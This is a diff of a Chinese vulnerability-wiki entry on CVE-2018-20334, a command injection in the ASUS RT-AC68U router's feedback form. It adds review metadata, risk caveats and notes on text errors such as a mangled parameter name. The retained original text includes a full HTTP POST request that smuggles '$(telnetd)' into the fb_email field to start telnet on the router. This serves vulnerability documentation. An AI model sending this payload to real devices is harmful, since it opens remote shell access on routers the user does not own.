@@ -1,8 +1,58 @@
 ---
 cve: "CVE-2018-20334"
+id: "vw-cc82a9a753d3e0db5e539612"
+entity_id: "ve-cc82a9a753d3e0db5e539612"
+schema_version: "1"
+title: "华硕 RT-AC68U 漏洞复现（二）"
+product: "ASUS RT-AC68U ASUSWRT"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "unknown"
+identifier_role: "primary"
+primary_identifiers: "CVE-2018-20334"
+referenced_identifiers: ""
+prerequisites: "描述易受影响384.20308，引用修复384.45708；HTTP会话和UDP18018前提不同"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/%E5%8D%8E%E7%A1%95/%E5%8D%8E%E7%A1%95%20RT-AC68U%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88%E4%BA%8C%EF%BC%89.md"
+review_date: "2026-10-02"
+side_effects: "畸形输入可能使进程/内核崩溃、设备重启或服务不可用；本文崩溃线索不自动证明稳定代码执行，需隔离环境和可恢复配置；执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
+source_url: "https://mp.weixin.qq.com/s/H3IzaDJ0Opqyy6JuAGrNIQ"
+source_status: "recorded"
 ---
 
 # 华硕 RT-AC68U 漏洞复现（二）
+
+<!-- article-review:devices:begin -->
+## 技术校订与证据边界（2026-10-02）
+
+- 产品/组件：ASUS RT-AC68U ASUSWRT
+- 本文讨论：CVE-2018-20334 fb_email命令注入；20336 wanduck溢出/泄露
+- 版本、权限与配置前提：描述易受影响384.20308，引用修复384.45708；HTTP会话和UDP18018前提不同
+- 资料类型：双漏洞源码与补丁对比；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果
+
+### 逐项校订
+
+- 元数据仅20334遗漏20336；应分清修复版发布说明与测试受影响固件
+- POST current_page被转成¤t_page、固定长度和Origin不同地址；p=(asp...)代码丢函数名
+- 20336泛描述堆溢出与实际栈数组越界不匹配；Python2字串脚本未标版本
+- 登录cookie呈现但20334权限条件未明确
+- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
+- 样例会话、令牌或共享秘密已按具体值遮罩中段并保留首尾；不能直接用于请求。公开默认/测试凭据与算法常量不因长得像密码而改写；其用途仍须按原文说明判断
+
+### 操作风险与恢复
+
+- 畸形输入可能使进程/内核崩溃、设备重启或服务不可用；本文崩溃线索不自动证明稳定代码执行，需隔离环境和可恢复配置
+- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据
+
+### 待核与来源
+
+- 修复/实测固件、auth状态、泄露回复长度待原始源码确认
+- 引用图片未查看，截图内容及有效性待核验
+- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
+- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
+<!-- article-review:devices:end -->
+
 
 <meta name="referrer" content="no-referrer"/>
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/H3IzaDJ0Opqyy6JuAGrNIQ)
@@ -62,7 +112,7 @@ CVE-2018-20334
 
 通过一下 post 包可以在受影响的路由器上启动 telnetd:
 
-```
+```http
 POST /start_apply.htm HTTP/1.1
 Host: 192.168.1.1
 Content-Length: 557
@@ -76,7 +126,7 @@ DNT: 1
 Referer: http://192.168.1.1/Advanced_Feedback.asp
 Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
-Cookie: asus_token=jrPgm5H7TNyhlpOT2CUonTvPLBX3zVc; clickedItem_tab=6
+Cookie: asus_token=jrP*************************zVc; clickedItem_tab=6
 Connection: close
 
 preferred_lang=CN¤t_page=Advanced_Feedback.asp&action_mode=apply&action_script=restart_sendmail&action_wait=60&PM_attach_syslog=0&PM_attach_cfgfile=0&PM_attach_iptables=&PM_attach_modemlog=0&PM_attach_wlanlog=0&feedbackresponse=&fb_experience=&fb_browserInfo=Mozilla%2F5.0+%28Windows+NT+10.0%3B+WOW64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F64.0.3282.186+Safari%2F537.36&fb_transid=E7B1B39C7A501054&fb_country=eee&fb_email=test%40test.com|$(telnetd)&dblog_enable=0&fb_ptype=No_selected&fb_pdesc=others&fb_comment=trwetwe3r&msglength=1991
